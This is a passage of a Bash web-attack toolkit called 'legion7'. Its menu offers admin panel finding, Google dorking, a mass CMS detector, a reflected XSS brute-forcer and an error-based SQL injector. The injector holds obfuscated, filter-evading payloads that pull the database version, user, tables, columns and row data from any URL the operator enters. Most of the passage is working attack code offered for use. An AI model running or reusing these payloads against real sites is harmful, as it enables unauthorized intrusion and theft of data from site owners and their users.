         xss=$(curl -A "$USER_AGENT" --max-time 5 -s -L -k "$point$payloads" | grep -oF "$payloads" | head -n 1)
             if [[ $xss == $payloads ]]; then
                 echo "   ${GREEN} $payloads${RESAT}"
                 echo "$payloads" >> "output/$site/vulnpayloads.txt"
             else
                 printf ''
             fi
    done < wordlist/xss_payloads.txt
echo -e "\n$(NT) possible vulnerable payloads was saved ${ITA}`pwd`/output/$site/vulnpayloads.txt${RESAT}"
echo -e "$(end_time)"
exit 1
}

# MASS CMS DETECTOR
CMS()
{
wordpress=$(curl -A "$USER_AGENT" --max-time 5 -s -L -k $site/wp-login.php | grep -o "user_login" | head -1)
wordpressx=$(curl -o /dev/null --write-out '%{http_code}\n' -A "$USER_AGENT" --max-time 5 -I -s -L -k $site/wp-content/)
joomla=$(curl -o /dev/null --write-out '%{http_code}\n' -A "$USER_AGENT" --max-time 5 -I -s -k -L $site/administrator/)
joomlax=$(curl -A "$USER_AGENT" --max-time 5 -s -k -L $site/ | grep -o "joomla" | head -1)
opencart=$(curl -o /dev/null --write-out '%{http_code}\n' -A "$USER_AGENT" --max-time 5 -I -s -k -L $site/catalog/view/javascript/common.js)
drupal=$(curl -o /dev/null --write-out '%{http_code}\n' -A "$USER_AGENT" --max-time 5 -I -s -k -L $site/misc/drupal.js)
magento=$(curl -o /dev/null --write-out '%{http_code}\n' -A "$USER_AGENT" --max-time 5 -I -s -k -L $site/js/mage/cookies.js)
magentox=$(curl -A "$USER_AGENT" --max-time 5 -s  -k -L $site/ | grep -o "magento" | head -n 1)
prestashop=$(curl -A "$USER_AGENT" --max-time 5 -s -k -L $site/ | grep -o "prestashop" | head -n 1)
concrete=$(curl -o /dev/null --write-out '%{http_code}\n' -A "$USER_AGENT" --max-time 5 -I -s -k -L $site/concrete/js/jquery.js)
weebly=$(curl -o /dev/null --write-out '%{http_code}\n' -A "$USER_AGENT" --max-time 5 -I -s -k -L $site/files/templateArtifacts.js)
dokuwiki=$(curl -o /dev/null --write-out '%{http_code}\n' -A "$USER_AGENT" --max-time 5 -I -s -k -L $site/lib/exe/js.php)
jekyll=$(curl -A "$USER_AGENT" --max-time 5 -s -k -L $site/ | grep -o "jekyllrb.com" | head -n 1)
}

SINGLE()
{
CMS
if [[ $wordpress == "user_login" || $wordpress == "200" ]]; then
    echo "WordPress"
else
    if [[ $joomla == "200" || $joomlax == "joomla" ]]; then
        echo "Joomla"
    else
        if [[ $opencart == "200" ]]; then
            echo "OpenCart"
        else
            if [[ $drupal == "200" ]]; then
                echo "Drupal"
            else
                if [[ $magento == "200" || $magentox == "magento" ]]; then
                    echo "Magento"
                else
                    if [[ $prestashop == "prestashop" ]]; then
                        echo "PrestaShop"
                    else
                        if [[ $concrete == "200" ]]; then
                            echo "Concrete5"
                        else
                            if [[ $weebly == "200" ]]; then
                                echo "Weebly"
                            else
                                if [[ $dokuwiki == "200" ]]; then
                                    echo "DokuWiki"
                                else
                                    if [[ $jekyll == "jekyllrb.com" ]]; then
                                        echo "Jekeyll"
                                    else
                                        echo "${FAD}Unknow${RESAT}"
                                    fi
                                fi
                            fi
                        fi
                    fi
                fi
            fi
        fi
    fi
fi

}

MASS()
{
while IFS= read -r site; do
CMS
if [[ $wordpress == "user_login" || $wordpress == "200" ]]; then
    printf "%-16s %s\n" "   [ WordPress " "] $site"
else
    if [[ $joomla == "200" || $joomlax == "joomla" ]]; then
        printf "%-16s %s\n" "   [ Joomla " "] $site"
    else
        if [[ $opencart == "200" ]]; then
            printf "%-16s %s\n" "   [ OpenCart " "] $site"
        else
            if [[ $drupal == "200" ]]; then
                printf "%-16s %s\n" "   [ Drupal " "] $site"
            else
                if [[ $magento == "200" || $magentox == "magento" ]]; then
                    printf "%-16s %s\n" "   [ Magento " "] $site"
                else
                    if [[ $prestashop == "prestashop" ]]; then
                        printf "%-16s %s\n" "   [ PrestaShop " "] $site"
                    else
                        if [[ $concrete == "200" ]]; then
                            printf "%-16s %s\n" "   [ Concrete5 " "] $site"
                        else
                            if [[ $weebly == "200" ]]; then
                                printf "%-16s %s\n" "   [ Weebly " "] $site"
                            else
                                if [[ $dokuwiki == "200" ]]; then
                                    printf "%-16s %s\n" "   [ DokuWiki " "] $site"
                                else
                                    if [[ $jekyll == "jekyllrb.com" ]]; then
                                        printf "%-16s %s\n" "   [ Jekeyll " "] $site"
                                    else
                                        printf "%-16s %s\n" "   [ ${FAD}Unknow CMS${RESAT} " "] $site"
                                    fi
                                fi
                            fi
                        fi
                    fi
                fi
            fi
        fi
    fi
fi
done < $file
}

WEBIN_MASSCMSDETECTOR()
{
SLIDE_BANNER;
cat << EOF
   +-----------------------------------------------------------+
   |     ${BLOD}${GREEN} legion7   ${WHITE}(${RESAT}${GREEN}  m a s s  C M S  d e t e c t o r  ${WHITE})${RESAT}     |
   +-----------------------------------------------------------+

EOF
echo -e "$(start_time) "
CHECK_NETWORK
echo -e "$(NT)  enter the wordlist file that you want to scan"
read -p " [${YELLOW}wordlist${RESAT}]: " file
    if [[ -f $file ]]; then
        echo -e "$(GT)  wordlist file: ${BLOD}$file${RESAT}"
        echo -e "$(NT)  total count of wordlist file: `cat $file | wc -l` generate words\n"
        MASS
    else
        echo -e "$(ET)  ${RED}wordlist file: $file  does not exist${RESAT}"
        echo -e "$(NT)  reloading mass CMS checker tool page"
        MASS
    fi
echo -e "\n$(end_time)"
}

# SQL INJECTOR ( ERROR BASED )
WEBIN_SQLINJECTOR()
{
dump_version="+/*!50000%4fR/**x**/*/+1+/*!50000%47ROUP/**x**/*/+/*!50000%42Y/**x**/*/+/*!50000%43ONCAT_WS/**x**/*/(0x3a,/*!50000%76ersion/**x**/*/(),/*!50000%46LOOR/**x**/*/(/*!50000%52AND/**x**/*/(0)*2))+/*!50000%48AVING/**x**/*/+MIN(0)+/*!50000%4fR/**x**/*/+1--+-"
dump_user="+/*!50000%4fR/**x**/*/+1+/*!50000%47ROUP/**x**/*/+/*!50000%42Y/**x**/*/+/*!50000%43ONCAT_WS/**x**/*/(0x3a,/*!50000user/**x**/*/(),/*!50000%46LOOR/**x**/*/(/*!50000%52AND/**x**/*/(0)*2))+/*!50000%48AVING/**x**/*/+MIN(0)+/*!50000%4fR/**x**/*/+1--+-"
dump_database="+/*!50000%41ND/**x**/*/(/*!50000%53ELECT/**x**/*/+1+/*!50000%46ROM/**x**/*/+(/*!50000%53ELECT/**x**/*/+%43OUNT(*),/*!50000%43ONCAT/**x**/*/((/*!50000%53ELECT/**x**/*/(/*!50000%53ELECT/**x**/*/+/*!50000%43ONCAT/**x**/*/(%43AST(/*!50000%44ATABASE/**x**/*/()+/*!50000%41S/**x**/*/+/*!50000%43HAR/**x**/*/),0x3a))+/*!50000%46ROM/**x**/*/+/*!50000%49NFORMATION_%53CHEMA/**x**/*/./*!50000%54ABLES/**x**/*/+/*!50000%57HERE/**x**/*/+/*!50000%74able_%73chema/**x**/*/=/*!50000%44ATABASE/**x**/*/()+/*!50000%4cIMIT/**x**/*/+0,1),/*!50000%46LOOR/**x**/*/(/*!50000%52AND*/(0)*2))x+/*!50000%46ROM/**x**/*/+/*!50000%49NFORMATION_%53CHEMA/**x**/*/./*!50000%54ABLES/**x**/*/+/*!50000%47ROUP/**x**/*/+/*!50000%42Y/**x**/*/+x)a)--+-"

dump_data="+/*!50000%41ND/**x**/*/+(/*!50000%53ELECT/**x**/*/+1+FROM+(/*!50000%53ELECT/**x**/*/+%43OUNT(*),/*!50000%43ONCAT/**x**/*/((/*!50000%53ELECT/**x**/*/(/*!50000%53ELECT/**x**/*/+/*!50000%43ONCAT/**x**/*/(%43AST(/*!50000%43ONCAT/**x**/*/(column,0x3a3a,column)+/*!50000%41S/**x**/*/+/*!50000%43HAR/**x**/*/),0x3a))+/*!50000%46ROM/**x**/*/+database.table+/*!50000%4cIMIT/**x**/*/+3,1),/*!50000%46LOOR/**x**/*/(/*!50000%52AND/**x**/*/(0)*2))x+/*!50000%46ROM/**x**/*/+/*!50000%49NFORMATION_%53CHEMA/**x**/*/./*!50000%54ABLES/**x**/*/+/*!50000%47ROUP/**x**/*/+/*!50000%42Y/**x**/*/+x)a)--+-"

SLIDE_BANNER;
cat << EOF
   +--------------------------------------------------------------------+
   |  ${BLOD}${GREEN} legion7${WHITE}(${RESAT}${GREEN}  S Q L  i n j e c t o r  - e r r o r  b a s e d  ${WHITE})${RESAT}  |
   +--------------------------------------------------------------------+

EOF
echo -e "$(start_time)"
CHECK_NETWORK
echo -e "$(NT)  enter the target ${BLOD}url/domain with parameter${RESAT} ${FAD}( http://www.example.com/index.php?id=1 )${RESAT}"
read -p " [ ${YELLOW}target${RESAT} ]: " target
site=$(echo $target | sed 's!http[s]*://!!g' | cut -d "/" -f 1)
CHECK_HOST
echo -e "$(NT)  scanning possible vulnerable parameter to inject"
inject_point=$(echo $target | grep -oP '(?<=[&?])[^&]*' | wc -l)
    if [[ $inject_point  == "1" ]]; then
        echo -e "$(NT)  found inject point: ${GREEN}$(echo $target | grep -oP '(?<=[&?])[^&]*')${RESAT}"
        inject=$(echo $target | cut -d "&" -f 1)
    else
        x=0
        for x in $(seq 0 "$(( $inject_point - 1 ))"); do
        i=$(($x+1))
            echo -e "$(WT)  [$x] inject point: ${GREEN}$(echo $target | grep -oP '(?<=[&?])[^&]*' | sed -n "$i p")${RESAT}  "
        done
        read -p "$(NT)  inject parameter was more than one.Which parameter do you want to inject? " x
            z=$(for o in $(seq $x); do printf "&[^&]*"; done)
            inject=$(echo $target | grep -o "^[^&]*$z")
    fi
echo -e "$(NT)  setting full url to inject: ${BLOD}$inject${RESAT}"
echo -e "$(NT)  checking the target with the single quote(%27)"
# CHECK VULNERABLITY
error=("Warning: mysql_query" "Warning: mysql_fetch_row" "Warning: mysql_fetch_assoc" "Warning: mysql_fetch_object" "Warning: mysql_numrows" "Warning: mysql_num_rows" "Warning: mysql_fetch_array" "Warning: pg_connect" "Supplied argument is not a valid PostgreSQL result" "PostgreSQL query failed: ERROR: parser: parse error" "MySQL Error" "MySQL ODBC" "MySQL Driver" "supplied argument is not a valid MySQL result resource" "on MySQL result index" "Oracle ODBC" "Oracle Error" "Oracle Driver" "Oracle DB2" "Microsoft JET Database Engine error" "ADODB.Command" "ADODB.Field error" "Microsoft Access Driver" "Microsoft VBScript runtime error" "Microsoft VBScript compilation error" "Microsoft OLE DB Provider for SQL Server error" "OLE/DB provider returned message" "OLE DB Provider for ODBC" "ODBC SQL" "ODBC DB2" "ODBC Driver" "ODBC Error" "ODBC Microsoft Access" "ODBC Oracle" "JDBC SQL" "JDBC Oracle" "JDBC MySQL" "JDBC error" "JDBC Driver" "Invision Power Board Database Error" "DB2 ODBC" "DB2 error" "DB2 Driver" "You have an error in your SQL syntax" "unexpected end of SQL command" "invalid query" "SQL command not properly ended" "Error converting data type varchar to numeric" "An illegal character has been found in the statement" "Active Server Pages error" "ASP.NET_SessionId" "ASP.NET is configured to show verbose error messages" "A syntax error has occurred" "ORA-01756" "Error Executing Database Query" "Unclosed quotation mark" "BOF or EOF" "GetArray" "FetchRow" "Input string was not in a correct format" "Warning: include" "Warning: require_once" "function.include" "Disallowed Parent Path" "function.require" "Warning: main" "Warning: session_start" "Warning: getimagesize" "Warning: mysql_result" "Warning: pg_exec" "Warning: array_merge" "Warning: preg_match" "Incorrect syntax near" "ORA-00921: unexpected end of SQL command" "Warning: ociexecute" "Warning: ocifetchstatement" "error ORA-")
curl -A "$USER_AGENT" --max-time 10 -s -k "$inject" > .zxcvbnm.txt
curl -A "$USER_AGENT" --max-time 10 -s -k "$inject%27" > .zxcvbnmz.txt
compare=$(diff -u .zxcvbnm.txt .zxcvbnmz.txt)
    if [[ $compare == "" ]]; then
        echo -e "$(ET)  ${RED}site is still normal when test with the single quote(%27)${RESAT}"
        echo -e "$(WT)  ${YELLOW}the target was not vuln ${RESAT}"
        echo -e "$(end_time)"
        exit 1
    else
        for i in "${error[@]}"; do
            if [[ $(cat .zxcvbnmz.txt | grep -o "$i" | head -1) == "$i" ]]; then
                echo "$i" > .error.txt
            fi
        done
        if [[ ! -f .error.txt ]]; then
            echo -e "$(ET)  ${RED}the target was not show error message${RESAT}"
            echo -e "$(end_time)"
            exit 1
        else
            rm .error.txt
            echo -e "$(NT)  it seems that the target is vulnerable"
            echo -e "$(NT)  injecting payloads\n"

            echo -e "\tVersion @ ${BLOD}$(curl -A ${USER_AGENT} -s -k "$inject%27$dump_version" | grep -Po "entry (.*?) for key" | cut -d "'" -f2 | cut -d ":" -f1)${RESAT}"
            echo -e "\tUser @ ${BLOD}$(curl -A ${USER_AGENT} -s -k "$inject%27$dump_user" | grep -Po "entry (.*?) for key" | cut -d "'" -f2 | cut -d ":" -f1)${RESAT}"
            echo -e "\tCurrent Database @ ${BLOD}$(curl -A ${USER_AGENT} -s -k "$inject%27$dump_database" | grep -Po "entry (.*?) for key" | cut -d "'" -f2 | cut -d ":" -f1)${RESAT}"
            echo -e "\tTables List @\n"
            for i in $(seq 0 1337); do
                tables=$(curl -A "$USER_AGENT" -s -k "$inject%27+/*!50000%41ND/**x**/*/(/*!50000%53ELECT/**x**/*/+1+/*!50000%46ROM/**x**/*/+(/*!50000%53ELECT/**x**/*/+%43OUNT(*),/*!50000%43ONCAT/**x**/*/((/*!50000%53ELECT/**x**/*/(/*!50000%53ELECT/**x**/*/+/*!50000%43ONCAT/**x**/*/(%43AST(/*!50000%74able_%6eame/**x**/*/+/*!50000%41S/**x**/*/+/*!50000%43HAR/**x**/*/),0x3a))+/*!50000%46ROM/**x**/*/+/*!50000%49NFORMATION_%53CHEMA/**x**/*/./*!50000%54ABLES/**x**/*/+/*!50000%57HERE/**x**/*/+/*!50000%74able_%73chema/**x**/*/=/*!DATABASE/**x**/*/()+/*!50000%4cIMIT/**x**/*/+$i,1),/*!50000%46LOOR/**x**/*/(/*!50000%52AND/**x**/*/(0)*2))x+/*!50000%46ROM/**x**/*/+/*!50000%49NFORMATION_%53CHEMA/**x**/*/./*!50000%54ABLES/**x**/*/+/*!50000%47ROUP/**x**/*/+/*!50000%42Y/**x**/*/+x)a)--+-" | grep -Po "entry (.*?) for key" | cut -d "'" -f2 | cut -d ":" -f1)
                    if [[ $tables == "" ]]; then
                        break
                    else
                        echo -e "\t\t- ${BLOD}$tables${RESAT}"
                    fi
            done
            echo -e "\n$(NT)  enter the table name to get columns"
            read -p " [ ${YELLOW}table ${RESAT} ]: " table
            echo -e "\n\tColumns List @\n"
            hex_table_name="0x$(echo "$table" | xxd -p | sed 's/0a//g')"
            for i in $(seq 0 1337); do
                columns=$(curl -A "$USER_AGENT" -s -k "$inject%27+/*!50000%41ND/**x**/*/+(/*!50000%53ELECT/**x**/*/+1+/*!50000%46ROM/**x**/*/+(/*!50000%53ELECT/**x**/*/+%43OUNT(*),/*!50000%43ONCAT/**x**/*/((/*!50000%53ELECT/**x**/*/(/*!50000%53ELECT/**x**/*/+/*!50000%43ONCAT/**x**/*/(%43AST(/*!50000%63olumn_%6eame/**x**/*/+/*!50000%41S/**x**/*/+/*!50000%43HAR/**x**/*/),0x3a))+/*!50000FROM/**x**/*/+/*!50000INFORMATION_SCHEMA/**x**/*/./*!50000%43OLUMNS/**x**/*/+/*!50000%57HERE/**x**/*/+/*!50000%74able_%6eame/**x**/*/=$hex_table_name+/*!50000%41ND/**x**/*/+/*!50000%74able_%73chema/**x**/*/=/*!DATABASE/**x**/*/()+/*!50000%4cIMIT/**x**/*/+$i,1),/*!50000%46LOOR/**x**/*/(/*!50000%52AND/**x**/*/(0)*2))x+/*!50000%46ROM/**x**/*/+/*!50000%49NFORMATION_%53CHEMA/**x**/*/./*!50000%54ABLES/**x**/*/+/*!50000%47ROUP/**x**/*/+/*!50000%42Y/**x**/*/+x)a)--+-" | grep -Po "entry (.*?) for key" | cut -d "'" -f2 | cut -d ":" -f1)
                    if [[ $columns == "" ]]; then
                        break
                    else
                        echo -e "\t\t- ${BLOD}$columns${RESAT}"
                    fi
            done
            echo -e "\n$(NT)  enter the columns name to dump data"
            read -p " [${YELLOW} column ${RESAT}]: " columns
            echo -e "\n\tDump Datas @\n"
            columns_name=$(echo $columns | sed 's/,/,0x3a3a,/g')
            for i in $(seq 0 1337); do
            datas=$(curl -A "$USER_AGENT" -s -k "$inject%27+/*!50000%41ND/**x**/*/+(/*!50000%53ELECT/**x**/*/+1+/*!50000%46ROM*/+(/*!50000%53ELECT/**x**/*/+%43OUNT(*),/*!50000%43ONCAT/**x**/*/((/*!50000%53ELECT/**x**/*/(/*!50000%53ELECT/**x**/*/+/*!50000%43ONCAT/**x**/*/(%43AST(/*!50000%43ONCAT/**x**/*/($columns_name)+/*!50000%41S/**x**/*/+/*!50000%43HAR/**x**/*/),0x7e))+/*!50000%46ROM/**x**/*/+$table+/*!50000%4cIMIT/**x**/*/+$i,1),/*!50000%46LOOR/**x**/*/(/*!50000%52AND/**x**/*/(0)*2))x+/*!50000%46ROM/**x**/*/+/*!50000%49N%46ORMATION_%53CHEMA/**x**/*/./*!50000%54ABLES/**x**/*/+/*!50000%47ROUP/**x**/*/+/*!50000%42Y/**x**/*/+x)a)--+-" | grep -Po "entry (.*?) for key" | cut -d "'" -f2 | cut -d "~" -f1)
                if [[ $datas == "" ]]; then
                    break
                else
                    echo -e "\t\t- ${BLOD}$datas${RESAT}"
                fi
            done
        fi
    fi
echo -e "\n$(end_time)"
}

## MAIN MENU
MAIN_MENU()
{
SLIDE_BANNER; wlctext;
cat << EOF
  [ ${GREEN}01${RESAT} ]  Admin Panel Finder
  [ ${GREEN}02${RESAT} ]  Basic Information Scanner
  [ ${GREEN}03${RESAT} ]  Bulk Domains To IP
  [ ${GREEN}04${RESAT} ]  GOOGLE Dorking
  [ ${GREEN}05${RESAT} ]  Mass CMS Detector
  [ ${GREEN}06${RESAT} ]  Mass HTTP Status Code Checker
  [ ${GREEN}07${RESAT} ]  Reflected XSS BruteForce
  [ ${GREEN}08${RESAT} ]  Reverse IP Domains Check
  [ ${GREEN}09${RESAT} ]  SQL Injector ${FAD}( Error Based )${RESAT}
  [ ${GREEN}10${RESAT} ]  Subdomains Enumerations
  [ ${GREEN}${FAD}00${RESAT} ]  Exit

EOF
read -p "  [ ${YELLOW}?${RESAT} ]: " scan_op
    case $scan_op in
        1 | 01 )  WEBIN_ADMINPANELFINDER;;
        2 | 02 )  WEBIN_BASICINFORMATIONSCANNER;;
        3 | 03 )  WEBIN_BULKDOMAINSTOIP;;
        4 | 04 )  WEBIN_GOOGLEDORKING;;
        5 | 05 )  WEBIN_MASSCMSDETECTOR;;
        6 | 06 )  WEBIN_MASSHTTPSTATUSCODECHECKER;;
        7 | 07 )  WEBIN_REFLECTEDXSSBRUTEFORCE;;
        8 | 08 )  WEBIN_REVERSEIPDOMAINCHECK;;
        9 | 09 )  WEBIN_SQLINJECTOR;;
        10 )  WEBIN_SUBDOMAINENUMERATION;;
        00 )  exit_msg;;
        *)  invaild_op_msg; MAIN_MENU;;
    esac
}

### RUN
MAIN_MENU
## CLEAN ALL OF THE LOG FILEz
rm .*.txt 2> /dev/null
